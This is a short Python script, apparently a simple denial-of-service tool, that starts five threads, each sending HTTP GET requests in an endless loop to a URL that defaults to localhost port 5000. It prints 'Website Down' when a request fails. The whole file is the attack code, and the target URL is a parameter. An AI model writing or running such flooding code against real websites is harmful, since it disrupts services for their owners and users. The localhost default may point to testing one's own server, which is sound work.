import threading
import sys
import requests

def dos(url = "http://127.0.0.1:5000"):
    while True:
        try:
            requests.get(url, headers={'Connection' : 'keep-alive'})
        except Exception:
            print("Website Down")
for _ in range(5):
	threading.Thread(target=dos).start()